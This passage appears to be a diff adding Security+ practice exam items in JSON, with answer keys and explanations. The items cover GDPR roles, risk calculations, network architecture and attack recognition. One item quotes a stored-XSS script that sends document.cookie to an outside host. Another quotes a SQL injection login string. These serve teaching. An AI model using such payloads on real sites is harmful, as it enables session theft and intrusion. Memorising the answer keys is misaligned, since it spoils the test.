+      "Brand impersonation",
+      "Disinformation campaign"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Business email compromise uses a real, taken-over business mailbox to request fraudulent payments or account changes. Brand impersonation fakes a company's identity from outside, but this message came from the legitimate account."
+  },
+  {
+    "id": "SECPLUS-T1-048",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "GDPR roles",
+    "stem": "A retailer hires a cloud payroll company to calculate wages using employee data, strictly following the retailer's instructions. Under GDPR, what role does the payroll company hold?",
+    "options": [
+      "Data processor",
+      "Data controller",
+      "Data subject",
+      "Data owner"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A processor handles personal data on behalf of and under the instructions of the controller. The retailer decides why and how data is used, so the retailer is the controller."
+  },
+  {
+    "id": "SECPLUS-T1-049",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Containerization",
+    "stem": "An administrator learns that a single kernel vulnerability on a host could affect every workload running on it. Which architecture is MOST exposed because workloads share the host kernel?",
+    "options": [
+      "Type 1 hypervisor virtual machines",
+      "Air-gapped physical servers",
+      "Containerization",
+      "Dedicated bare-metal hosts"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Containers share the host operating system kernel, so a kernel flaw can affect all containers on that host. Virtual machines are tempting, but each VM runs its own guest kernel isolated by the hypervisor."
+  },
+  {
+    "id": "SECPLUS-T1-050",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Media sanitization",
+    "stem": "A company plans to sell retired SSDs to a refurbisher. Which approach BEST ensures data cannot be recovered while keeping the drives reusable?",
+    "options": [
+      "Cryptographic or vendor secure erase",
+      "Degaussing each drive",
+      "Physically shredding the drives",
+      "Quick-formatting the drives and deleting all partitions"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Secure erase or crypto erase sanitizes flash media and leaves it usable. Degaussing does not affect SSD flash cells, and shredding prevents reuse."
+  },
+  {
+    "id": "SECPLUS-T1-051",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Watering hole attacks",
+    "stem": "Engineers at several aerospace firms were infected after visiting a niche industry forum that attackers had injected with an exploit kit. Which technique did the attackers use?",
+    "options": [
+      "Watering hole",
+      "Typosquatting",
+      "Spear phishing",
+      "Pretexting"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A watering hole attack compromises a site the target group already trusts and visits. Spear phishing would send a crafted message to the victims rather than waiting at a shared site."
+  },
+  {
+    "id": "SECPLUS-T1-052",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Certificate of destruction",
+    "stem": "A third-party vendor destroys a hospital's old hard drives on its behalf. What should the hospital obtain to document that destruction occurred?",
+    "options": [
+      "A service level agreement",
+      "A memorandum of understanding",
+      "A certificate of destruction",
+      "A purchase order receipt from the vendor"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Certification of destruction is the formal evidence that media was sanitized or destroyed. An SLA defines expected service levels but proves nothing about a specific job."
+  },
+  {
+    "id": "SECPLUS-T1-053",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Privacy rights",
+    "stem": "A former customer living in the EU asks a company to erase all personal information it holds about her. Which privacy right is she exercising?",
+    "options": [
+      "Right to rectification",
+      "Right to data portability",
+      "Right of access",
+      "Right to be forgotten"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "The right to be forgotten (erasure) lets a data subject request deletion of personal data. The right of access only lets her see what is held, not remove it."
+  },
+  {
+    "id": "SECPLUS-T1-054",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Physical security",
+    "stem": "Employees report that unauthorized visitors are following badge holders through the data center's main door. Which physical control would BEST prevent this tailgating?",
+    "options": [
+      "Additional video surveillance cameras",
+      "Bollards at the building entrance",
+      "Brighter lighting at the doorway",
+      "Access control vestibule"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "An access control vestibule lets only one person through at a time, physically stopping tailgating. Video surveillance can record tailgating after the fact but does not prevent it."
+  },
+  {
+    "id": "SECPLUS-T1-055",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "IoT segmentation",
+    "stem": "A company deploys hundreds of smart building sensors that ship with default credentials and weak update mechanisms. Which approach BEST reduces the risk they pose to corporate systems?",
+    "options": [
+      "Place them on an isolated IoT network segment",
+      "Join them to the corporate Active Directory domain",
+      "Allow vendor support through open inbound ports",
+      "Put them on the same VLAN as file servers"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Isolating IoT devices on their own segment limits what an attacker can reach if a weak device is compromised. Putting them on the file server VLAN or opening inbound ports expands the attack surface instead."
+  },
+  {
+    "id": "SECPLUS-T1-056",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Static code analysis",
+    "stem": "A team wants to find insecure coding patterns in source code before the application is compiled or executed. Which technique should they use?",
+    "options": [
+      "Dynamic application security testing",
+      "Static code analysis",
+      "Fuzzing the running application",
+      "An unauthenticated network vulnerability scan"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Static analysis (SAST) reviews source code without running it. Dynamic testing and fuzzing both require a running application."
+  },
+  {
+    "id": "SECPLUS-T1-057",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Typosquatting",
+    "stem": "Proxy logs show users browsing to micros0ft-support.com and entering credentials on a page that mimics the vendor's login portal. Which technique BEST explains how users reached the site?",
+    "options": [
+      "DNS cache poisoning",
+      "Watering hole",
+      "Typosquatting",
+      "On-path attack"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Typosquatting registers look-alike domains, such as a zero in place of the letter o, to catch mistyped or careless clicks. DNS poisoning would send users to a bad IP while they still saw the real domain name."
+  },
+  {
+    "id": "SECPLUS-T1-058",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "order",
+    "skill": "Risk management process",
+    "stem": "A company is starting a formal risk management program. Place the steps in the order they should occur.",
+    "options": [
+      "Identify threats to key assets",
+      "Analyze likelihood and impact",
+      "Select a risk response strategy",
+      "Implement the chosen controls",
+      "Monitor risks and report"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3,
+      4
+    ],
+    "explanation": "Risks must be identified before they can be analyzed, and analysis drives which response to choose. Controls are implemented after the response is chosen, and monitoring continues afterward to catch changes."
+  },
+  {
+    "id": "SECPLUS-T1-059",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Failure modes",
+    "stem": "An inline IPS protecting a payment network fails, and company policy states that security takes priority over availability. How should the IPS be configured to behave?",
+    "options": [
+      "Fail-closed, blocking all traffic",
+      "Fail-open, passing all traffic",
+      "Switch to passive monitoring",
+      "Reroute traffic through the load balancer"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Fail-closed stops all traffic when the device fails, preserving security at the cost of availability. Fail-open keeps traffic flowing but uninspected, which suits availability-first environments, not this one."
+  },
+  {
+    "id": "SECPLUS-T1-060",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Credentialed scanning",
+    "stem": "A vulnerability scanner reports few findings on Windows servers, but administrators know several patches are missing. What change would MOST improve accuracy?",
+    "options": [
+      "Switch to an unauthenticated external scan",
+      "Run credentialed scans",
+      "Limit the scan to the top 100 ports",
+      "Pause plugin updates while scanning"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Credentialed scans log in and read installed software and patch levels, reducing false negatives. An unauthenticated external scan sees even less of the host."
+  },
+  {
+    "id": "SECPLUS-T1-061",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Unsecure networks",
+    "stem": "Sales staff routinely connect to open hotel Wi-Fi, and a packet capture shows plaintext internal application traffic. Which mitigation BEST protects this data in transit?",
+    "options": [
+      "Disabling Bluetooth radios",
+      "An application allow list",
+      "Host-based intrusion prevention",
+      "Always-on VPN encryption"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Unsecure wireless networks expose traffic to sniffing, and encrypting it through an always-on VPN protects the data in transit. A host-based IPS blocks malicious activity on the laptop but does not hide plaintext traffic from eavesdroppers."
+  },
+  {
+    "id": "SECPLUS-T1-062",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "matrix",
+    "skill": "Control categories",
+    "stem": "For each control, select the security control category it belongs to.",
+    "rows": [
+      "Bollards at the lobby entrance",
+      "Full-disk encryption on laptops",
+      "Annual enterprise risk assessment",
+      "Security awareness training",
+      "Firewall rule blocking Telnet"
+    ],
+    "columns": [
+      "Technical",
+      "Managerial",
+      "Operational",
+      "Physical"
+    ],
+    "correct": [
+      3,
+      0,
+      1,
+      2,
+      0
+    ],
+    "explanation": "Bollards are physical; disk encryption and firewall rules are technical controls enforced by systems; a risk assessment is a managerial (oversight) control; awareness training is operational because people carry it out. Training is often mistaken for managerial, but managerial controls set direction rather than perform day-to-day work."
+  },
+  {
+    "id": "SECPLUS-T1-063",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Qualitative risk",
+    "stem": "A risk committee rates each threat as high, medium, or low based on expert judgment instead of dollar values. Which analysis approach is being used?",
+    "options": [
+      "Quantitative",
+      "Qualitative",
+      "Single loss expectancy",
+      "Annualized rate of occurrence"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Qualitative analysis uses relative ratings such as high, medium, and low. Quantitative analysis assigns monetary values using metrics like SLE and ALE."
+  },
+  {
+    "id": "SECPLUS-T1-064",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Threat intelligence",
+    "stem": "A regional hospital wants threat intelligence that is shared specifically among healthcare organizations about attacks they are seeing. Which source BEST fits?",
+    "options": [
+      "A dark web marketplace",
+      "A vendor's proprietary antivirus feed",
+      "Public OSINT searches of social media",
+      "An industry ISAC"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Information Sharing and Analysis Centers share sector-specific threat intelligence among members. A proprietary vendor feed is general-purpose rather than built around a single industry's peers."
+  },
+  {
+    "id": "SECPLUS-T1-065",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Device placement",
+    "stem": "A team wants to inspect network traffic for attacks without adding latency or a point of failure to the production link. Which deployment BEST meets this requirement?",
+    "options": [
+      "An IPS deployed inline",
+      "A WAF in front of the web server",
+      "An IDS connected to a network tap",
+      "A proxy server in transparent mode"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A passive IDS on a tap or SPAN port sees copies of traffic, so it cannot slow or break the link. An inline IPS can block attacks but sits in the traffic path, adding latency and a possible failure point."
+  },
+  {
+    "id": "SECPLUS-T1-066",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Buffer overflow",
+    "stem": "An IDS alert shows a request to a legacy service containing 2,000 repeated 0x90 bytes followed by shellcode. Which attack is MOST likely being attempted?",
+    "options": [
+      "Buffer overflow",
+      "SQL injection",
+      "Directory traversal",
+      "Cross-site scripting"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A long run of 0x90 NOP bytes followed by shellcode is a NOP sled used to overflow a buffer and inject code into memory. SQL injection would contain database syntax such as quotes and OR clauses."
+  },
+  {
+    "id": "SECPLUS-T1-067",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "False positives",
+    "stem": "A scanner flags an Apache vulnerability on a server, but the administrator confirms the server runs IIS with no Apache installed. What is this finding?",
+    "options": [
+      "A false negative",
+      "A false positive",
+      "A true positive",
+      "A zero-day vulnerability"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A false positive reports a vulnerability that does not exist. A false negative is the opposite: a real vulnerability the scanner missed."
+  },
+  {
+    "id": "SECPLUS-T1-068",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Single loss expectancy",
+    "stem": "A file server valued at \\$200,000 would lose 40% of its value in a flood. What is the single loss expectancy?",
+    "options": [
+      "\\$120,000",
+      "\\$500,000",
+      "\\$80,000",
+      "\\$40,000"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "SLE = asset value x exposure factor = \\$200,000 x 0.40 = \\$80,000. The \\$120,000 figure is the value that survives the flood, not the loss."
+  },
+  {
+    "id": "SECPLUS-T1-069",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Physical sensors",
+    "stem": "A museum wants an alarm that detects intruders by their body heat as they move through a dark gallery. Which sensor type BEST fits this requirement?",
+    "options": [
+      "Pressure",
+      "Ultrasonic",
+      "Infrared",
+      "Microwave"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Passive infrared sensors detect changes in heat signatures, such as a warm body crossing the field of view. Microwave and ultrasonic sensors detect motion from reflected signals, not body heat."
+  },
+  {
+    "id": "SECPLUS-T1-070",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Race conditions",
+    "stem": "A program checks that a user may write to a temporary file, but an attacker swaps the file for a symbolic link to /etc/shadow before the write occurs. Which vulnerability is this?",
+    "options": [
+      "Memory injection into a process",
+      "Race condition (TOC/TOU)",
+      "Directory traversal",
+      "Virtual machine resource reuse"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "The gap between the time of check and the time of use lets the attacker change the resource after it was validated, which is a race condition. Directory traversal manipulates paths in input, not timing."
+  },
+  {
+    "id": "SECPLUS-T1-071",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "CVE identifiers",
+    "stem": "A vendor advisory references CVE-2024-3094. What does this identifier represent?",
+    "options": [
+      "A severity score from 0 to 10",
+      "A unique ID for a publicly disclosed vulnerability",
+      "A vendor's internal patch build number",
+      "A compliance checklist item from a CIS hardening benchmark"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Common Vulnerabilities and Exposures assigns unique identifiers to publicly known vulnerabilities. The 0 to 10 severity score comes from CVSS, not CVE."
+  },
+  {
+    "id": "SECPLUS-T1-072",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Jump servers",
+    "stem": "Administrators must manage servers in a secure network zone, but direct connections from their workstations are prohibited. Which device should they connect through first?",
+    "options": [
+      "Forward proxy",
+      "Load balancer",
+      "Jump server",
+      "Network tap"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A jump server is a hardened, monitored host in the secure zone used as the single entry point for administration. A forward proxy is tempting, but it brokers outbound web requests rather than administrative sessions."
+  },
+  {
+    "id": "SECPLUS-T1-073",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Annualized loss expectancy",
+    "stem": "A data breach has a single loss expectancy of \\$50,000 and is expected once every four years. What is the annualized loss expectancy?",
+    "options": [
+      "\\$25,000",
+      "\\$200,000",
+      "\\$12,500",
+      "\\$50,000"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Once every four years is an ARO of 0.25, so ALE = SLE x ARO = \\$50,000 x 0.25 = \\$12,500. Multiplying by 4 instead of 0.25 gives the wrong \\$200,000."
+  },
+  {
+    "id": "SECPLUS-T1-074",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Vulnerability prioritization",
+    "stem": "Two servers share the same critical CVSS base score; one is internet-facing and the other sits on an isolated lab network. How should the analyst prioritize?",
+    "options": [
+      "Remediate the internet-facing server first",
+      "Remediate both simultaneously regardless of exposure",
+      "Remediate the lab server first because it is unmonitored",
+      "Defer both until the next annual audit"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Environmental variables such as exposure adjust real-world priority beyond the CVSS base score. The isolated lab host is far less reachable, so it ranks lower."
+  },
+  {
+    "id": "SECPLUS-T1-075",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "SQL injection",
+    "stem": "A web server log contains the request /login?user=admin'--&pass=x followed by a successful administrator session. Which attack does this entry indicate?",
+    "options": [
+      "SQL injection",
+      "Cross-site scripting",
+      "Credential replay",
+      "Buffer overflow"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The quote and double dash close the query string and comment out the password check, a classic SQL injection. Credential replay would reuse captured valid credentials rather than inject query syntax."
+  },
+  {
+    "id": "SECPLUS-T1-076",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "802.1X authentication",
+    "stem": "A company configures switch ports so devices receive network access only after authenticating with EAP against a RADIUS server. In this 802.1X design, which component is the authenticator?",
+    "options": [
+      "The client supplicant",
+      "The RADIUS server",
+      "The certificate authority",
+      "The switch"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "In 802.1X the switch or access point is the authenticator that relays EAP messages between the supplicant and the authentication server. The RADIUS server is tempting, but it is the authentication server that makes the decision."
+  },
+  {
+    "id": "SECPLUS-T1-077",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Compensating controls",
+    "stem": "A critical server cannot be patched until the vendor certifies the update next quarter. Which response is MOST appropriate in the meantime?",
+    "options": [
+      "Accept the risk with no documentation",
+      "Uninstall the vendor application from the server immediately",
+      "Apply compensating controls such as segmentation",
+      "Disable logging to reduce the attack surface"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Compensating controls like segmentation reduce risk until patching is possible, usually under a documented exception. Accepting risk without documentation skips the required exception process."
+  },
+  {
+    "id": "SECPLUS-T1-078",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Exposure factor",
+    "stem": "An asset valued at \\$400,000 has a calculated single loss expectancy of \\$100,000. What is its exposure factor?",
+    "options": [
+      "4%",
+      "75%",
+      "25%",
+      "40%"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Exposure factor = SLE / asset value = \\$100,000 / \\$400,000 = 25%. The 75% figure is the portion of value that remains after the loss."
+  },
+  {
+    "id": "SECPLUS-T1-079",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Deception technology",
+    "stem": "A database administrator inserts a fake customer record with a unique email address that is never used legitimately; any message to it signals a breach. Which deception technology is this?",
+    "options": [
+      "Honeypot",
+      "Honeyfile",
+      "Honeynet",
+      "Honeytoken"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A honeytoken is fake data, such as a bogus record or credential, whose use proves that data was accessed or stolen. A honeyfile is a decoy file that alerts when opened, not a record planted inside a database."
+  },
+  {
+    "id": "SECPLUS-T1-080",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Cross-site scripting",
+    "stem": "Forum visitors report that viewing one post sends their session cookies to an unknown domain; the post contains <script>fetch('//x.io/?c='+document.cookie)</script>. Which vulnerability was exploited?",
+    "options": [
+      "SQL injection",
+      "Stored cross-site scripting",
+      "Cross-site request forgery",
+      "Directory traversal"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Script saved in a post and executed in other users' browsers is stored cross-site scripting. Request forgery makes the victim's browser submit an unwanted action, not run attacker script to steal cookies."
+  },
+  {
+    "id": "SECPLUS-T1-081",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Remediation validation",
+    "stem": "After patches are applied for a critical finding, what should the security team do to validate the remediation?",
+    "options": [
+      "Close the ticket based on the patch report",
+      "Rescan the affected systems",
+      "Lower the CVSS score of the finding",
+      "Notify the vendor that patching is complete"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Rescanning verifies that the vulnerability is actually gone. A patch report shows that a patch was pushed, not that it installed and fixed the issue."
+  },
+  {
+    "id": "SECPLUS-T1-082",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Web application firewalls",
+    "stem": "A public web application is repeatedly targeted with SQL injection and cross-site scripting attempts. Which security device is BEST suited to block these attacks?",
+    "options": [
+      "Web application firewall",
+      "Layer 4 stateful firewall",
+      "Network load balancer",
+      "Site-to-site VPN concentrator"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A WAF inspects HTTP requests and blocks application-layer attacks such as SQL injection and XSS. A layer 4 firewall only sees addresses and ports, so it cannot recognize malicious content inside allowed web traffic."
+  },
+  {
+    "id": "SECPLUS-T1-083",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Penetration testing",
+    "stem": "During an exercise, attackers and defenders share findings in real time so detections are tuned while the attack proceeds. Which penetration testing approach is this?",
+    "options": [
+      "Defensive",
+      "Physical",
+      "Offensive",
+      "Integrated"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Integrated (purple team) testing combines offensive and defensive teams working together. Offensive testing alone simulates attackers without collaborative tuning of defenses."
+  },
+  {
+    "id": "SECPLUS-T1-084",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "VM escape",
+    "stem": "A tenant on a shared hypervisor exploits a flaw in the virtual graphics driver and gains code execution on the host, reaching other tenants' guests. Which vulnerability is this?",
+    "options": [
+      "Resource reuse",
+      "VM escape",
+      "Jailbreaking",
+      "Cloud misconfiguration"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Breaking out of a guest to the hypervisor and other guests is a virtual machine escape. Resource reuse exposes leftover data in reallocated memory or storage rather than giving code execution on the host."
+  },
+  {
+    "id": "SECPLUS-T1-085",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "order",
+    "skill": "Vulnerability management",
+    "stem": "A security team runs its vulnerability management program for a new set of servers. Place the activities in the order they occur.",
+    "options": [
+      "Identify vulnerabilities with a scan",
+      "Analyze and prioritize the findings",
+      "Remediate or apply compensating controls",
+      "Rescan to validate remediation",
+      "Report results to stakeholders"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3,
+      4
+    ],
+    "explanation": "Findings must exist before they can be prioritized, and only prioritized findings are remediated. Validation by rescanning confirms the fix, and reporting comes last so it reflects verified results rather than patch claims."
+  },
+  {
+    "id": "SECPLUS-T1-086",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Change management",
+    "stem": "A network team plans a core switch firmware upgrade. Before approving, the change advisory board asks how service will be restored if the upgrade fails. Which document answers this?",
+    "options": [
+      "Backout plan",
+      "Impact analysis",
+      "Standard operating procedure",
+      "Test results"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A backout plan defines how to roll back a change and restore the previous state if it fails. An impact analysis estimates the effects and risk of the change but does not describe the rollback steps."
+  },
+  {
+    "id": "SECPLUS-T1-087",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Next-gen firewalls",
+    "stem": "A firewall must block one specific social media application even though it uses port 443 like all other web traffic. Which capability is required?",
+    "options": [
+      "Layer 4 port filtering",
+      "Stateless packet filtering",
+      "Network address translation",
+      "Layer 7 application awareness"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Next-generation firewalls inspect traffic at layer 7 and can identify individual applications regardless of port. Layer 4 filtering would have to block all of port 443 and cannot tell applications apart."
+  },
+  {
+    "id": "SECPLUS-T1-088",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "RTO and RPO",
+    "stem": "A BIA sets an RTO of 4 hours and an RPO of 1 hour. Backups run every 2 hours, and restoration takes 3 hours. Which statement is correct?",
+    "options": [
+      "Only the RPO is missed",
+      "Both objectives are missed",
+      "Only the RTO is missed",
+      "Both objectives are met"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A 3-hour restore fits the 4-hour RTO, but 2-hour backup intervals can lose up to 2 hours of data, exceeding the 1-hour RPO. RPO measures tolerable data loss, not restoration time."
+  },
+  {
+    "id": "SECPLUS-T1-089",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Threat actor attributes",
+    "select": 2,
+    "stem": "Investigators attribute a multi-year intrusion with custom malware to a nation-state actor. Which TWO attributes typically distinguish this type of threat actor? (Choose two.)",
+    "options": [
+      "Extensive resources and funding",
+      "High technical sophistication",
+      "Seeks public attention for a cause",
+      "Relies on publicly available tools",
+      "Usually works inside the target"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Nation-state actors are well funded and highly sophisticated, which is why they can develop custom exploits and persist for years. Seeking attention for a cause describes a hacktivist, not a state-sponsored group."
+  },
+  {
+    "id": "SECPLUS-T1-090",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "SIEM",
+    "stem": "A security team needs to correlate logs from firewalls, servers, and applications in one place and alert on suspicious patterns. Which tool BEST meets this need?",
+    "options": [
+      "NetFlow collector",
+      "SCAP scanner",
+      "SIEM",
+      "DLP"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A SIEM aggregates and correlates log data from many sources and generates alerts. A NetFlow collector only summarizes network traffic flows."
+  },
+  {
+    "id": "SECPLUS-T2-001",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "SCAP",
+    "stem": "An organization wants to automate checking systems against configuration benchmarks using standardized, machine-readable content. Which framework supports this?",
+    "options": [
+      "SNMPv3",
+      "SAML 2.0",
+      "SCAP",
+      "TAXII"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "The Security Content Automation Protocol provides standard formats for automated configuration and vulnerability checking against benchmarks. TAXII transports threat intelligence, not configuration checks."
+  },
+  {
+    "id": "SECPLUS-T2-002",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Malicious updates",
+    "stem": "A vendor's digitally signed software update was found to contain a backdoor inserted at its build server, affecting thousands of customers. Which vulnerability type BEST describes this?",
+    "options": [
+      "Operating system zero-day",
+      "Hardware provider tampering",
+      "Side loading",
+      "Malicious update"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A trusted, signed update that carries attacker code is a malicious update delivered through a software provider in the supply chain. Hardware provider tampering involves physical components, not a software build."
+  },
+  {
+    "id": "SECPLUS-T2-003",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Anomalous behavior",
+    "stem": "An employee accidentally emails a spreadsheet of customer records to the wrong external recipient. Which type of anomalous behavior does this represent?",
+    "options": [
+      "Unintentional",
+      "Unexpected",
+      "Malicious",
+      "Risky"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "An honest mistake with no intent to cause harm is unintentional behavior. Risky behavior is a deliberate choice that ignores policy, such as bypassing a control for convenience."
+  },
+  {
+    "id": "SECPLUS-T2-004",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "IPSec modes",
+    "stem": "A site-to-site VPN must encrypt the entire original IP packet, including its headers, between two gateways. Which IPSec configuration should be used?",
+    "options": [
+      "AH in transport mode",
+      "ESP in transport mode",
+      "ESP in tunnel mode",
+      "AH in tunnel mode"
+    ],
+    "correct": [
+      2
+    ],
